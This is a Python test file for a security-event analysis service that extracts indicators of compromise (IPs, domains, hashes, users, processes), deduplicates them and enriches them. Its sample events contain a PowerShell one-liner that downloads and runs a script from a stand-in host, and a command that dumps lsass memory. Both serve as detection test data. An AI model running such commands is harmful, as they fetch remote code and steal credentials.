from datetime import datetime, timezone
import pytest

from app.models.schemas import SecurityEvent, IOC
from app.modules.extraction.extractors import (
    extract_ips,
    extract_domains,
    extract_hashes,
    extract_usernames,
    extract_hostnames,
    extract_processes,
)
from app.modules.extraction.service import EntityIOCExtractionService
from app.modules.enrichment.service import ThreatIntelEnrichmentService
from app.modules.enrichment.adapters.local import LocalRuleEnricher
from app.modules.enrichment.adapters.external import ExternalThreatIntelAdapter
from app.modules.ingestion.service import LogIngestionService


def test_ip_extraction():
    event = SecurityEvent(
        event_id="evt-ip-1",
        timestamp=datetime.now(timezone.utc),
        source="network",
        host="10.0.1.25",
        event_type="network_connection",
        severity="INFO",
        raw_data={
            "SourceIp": "10.0.1.25",
            "DestinationIp": "185.220.101.5",
            "CommandLine": "curl 198.51.100.77:8080",
        },
    )
    ips = extract_ips(event)
    assert "10.0.1.25" in ips
    assert "185.220.101.5" in ips
    assert "198.51.100.77" in ips
    assert "127.0.0.1" not in ips


def test_domain_extraction():
    event = SecurityEvent(
        event_id="evt-domain-1",
        timestamp=datetime.now(timezone.utc),
        source="dns",
        host="PC01",
        event_type="dns_query",
        severity="HIGH",
        raw_data={
            "QueryName": "exfil-c2.malicious-domain.xyz",
            "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://payload-drop.xyz/s.ps1')",
        },
    )
    domains = extract_domains(event)
    assert "exfil-c2.malicious-domain.xyz" in domains
    assert "payload-drop.xyz" in domains
    assert not any(d.endswith(".ps1") for d in domains)


def test_hash_extraction():
    sha256_val = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
    md5_val = "d41d8cd98f00b204e9800998ecf8427e"

    event = SecurityEvent(
        event_id="evt-hash-1",
        timestamp=datetime.now(timezone.utc),
        source="edr",
        host="DB-SERVER",
        event_type="edr_alert",
        severity="HIGH",
        raw_data={
            "SHA256": sha256_val,
            "MD5": md5_val,
        },
    )
    hashes = extract_hashes(event)
    hash_map = {htype: hval for htype, hval in hashes}
    assert hash_map.get("sha256") == sha256_val
    assert hash_map.get("md5") == md5_val


def test_username_host_process_extraction():
    event = SecurityEvent(
        event_id="evt-ent-1",
        timestamp=datetime.now(timezone.utc),
        source="powershell",
        host="FINANCE-PC01.corp.internal",
        user="CORP\\jsmith",
        event_type="powershell_script_execution",
        severity="CRITICAL",
        raw_data={
            "Computer": "FINANCE-PC01.corp.internal",
            "TargetUserName": "CORP\\admin_svc",
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "procdump.exe -ma lsass.exe",
        },
    )
    users = extract_usernames(event)
    hosts = extract_hostnames(event)
    processes = extract_processes(event)

    assert "jsmith" in users
    assert "admin_svc" in users
    assert "SYSTEM" not in users

    assert "FINANCE-PC01.corp.internal" in hosts

    assert "powershell.exe" in processes
    assert "procdump.exe" in processes


def test_duplicate_ioc_handling_and_linking(db):
    extraction_svc = EntityIOCExtractionService()

    now = datetime.now(timezone.utc)
    # Event 1 contains IP 185.220.101.5
    e1 = SecurityEvent(
        event_id="evt-link-101",
        timestamp=now,
        source="network",
        host="PC01",
        event_type="network_connection",
        severity="HIGH",
        raw_data={"DestinationIp": "185.220.101.5"},
    )
    # Event 2 contains SAME IP 185.220.101.5 on different host
    e2 = SecurityEvent(
        event_id="evt-link-102",
        timestamp=now,
        source="network",
        host="PC02",
        event_type="network_connection",
        severity="HIGH",
        raw_data={"DestinationIp": "185.220.101.5"},
    )

    from app.db.repository import security_event_repo
    security_event_repo.save(db, e1)
    security_event_repo.save(db, e2)

    # Extract IOCs from both events
    res = extraction_svc.extract_and_store_from_events(db, ["evt-link-101", "evt-link-102"])

    # Query IP IOC
    iocs = extraction_svc.list_iocs(db, ioc_type="ip")
    matching_iocs = [i for i in iocs if i.value == "185.220.101.5"]

    # Exactly 1 deduplicated record exists
    assert len(matching_iocs) == 1
    ip_ioc = matching_iocs[0]

    # Both event IDs are linked
    related_ids = ip_ioc.metadata.get("related_event_ids", [])
    assert "evt-link-101" in related_ids
    assert "evt-link-102" in related_ids


def test_local_enrichment():
    local_enricher = LocalRuleEnricher()

    # Private IP
    private_ip_ioc = IOC(
        id="ioc-priv-1",
        type="ip",
        value="10.0.4.15",
    )
    res_priv = local_enricher.enrich(private_ip_ioc)
    assert res_priv["reputation"] == "benign"
    assert "internal_network" in res_priv["tags"]
    assert res_priv["status"] == "enriched"

    # Suspicious TLD
    domain_ioc = IOC(
        id="ioc-dom-1",
        type="domain",
        value="exfil-c2.xyz",
    )
    res_dom = local_enricher.enrich(domain_ioc)
    assert res_dom["reputation"] == "suspicious"
    assert "suspicious_tld" in res_dom["tags"]

    # Offensive Tool Process
    proc_ioc = IOC(
        id="ioc-proc-1",
        type="process",
        value="mimikatz.exe",
    )
    res_proc = local_enricher.enrich(proc_ioc)
    assert res_proc["reputation"] == "malicious"
    assert "credential_dumping_tool" in res_proc["tags"]


def test_enrichment_unavailable_when_no_api_key():
    external_enricher = ExternalThreatIntelAdapter(api_key=None)
    assert not external_enricher.is_available()

    ioc = IOC(
        id="ioc-test-1",
        type="ip",
        value="198.51.100.1",
    )
    result = external_enricher.enrich(ioc)
    assert result["status"] == "unavailable"
    assert result["reputation"] == "unknown"
    assert result["confidence"] == 0.0
    assert "external_intel_unconfigured" in result["tags"]


def test_ioc_api_endpoints(client):
    # Ingest event with IOCs
    payload = {
        "source": "network",
        "SourceIp": "10.0.9.15",
        "DestinationIp": "185.220.101.99",
        "DestinationPort": 4444,
        "action": "ALLOW",
        "TimeCreated": "2026-09-12T01:00:00Z",
    }
    client.post("/api/v1/events/ingest", json=payload)

    # Trigger extraction via POST /api/v1/iocs/extract
    res_extract = client.post("/api/v1/iocs/extract")
    assert res_extract.status_code == 200
    extract_data = res_extract.json()
    assert extract_data["unique_iocs_stored"] >= 1

    # List IOCs via GET /api/v1/iocs
    res_list = client.get("/api/v1/iocs?type=ip")
    assert res_list.status_code == 200
    iocs_list = res_list.json()
    assert len(iocs_list) >= 1

    ioc_id = iocs_list[0]["id"]

    # Retrieve specific IOC with related events via GET /api/v1/iocs/{ioc_id}
    res_single = client.get(f"/api/v1/iocs/{ioc_id}")
    assert res_single.status_code == 200
    single_data = res_single.json()
    assert "ioc" in single_data
    assert "events" in single_data
    assert len(single_data["events"]) >= 1

    # Enrich specific IOC via POST /api/v1/iocs/{ioc_id}/enrich
    res_enrich = client.post(f"/api/v1/iocs/{ioc_id}/enrich")
    assert res_enrich.status_code == 200
    enriched_ioc = res_enrich.json()
    assert "enrichment" in enriched_ioc["metadata"]
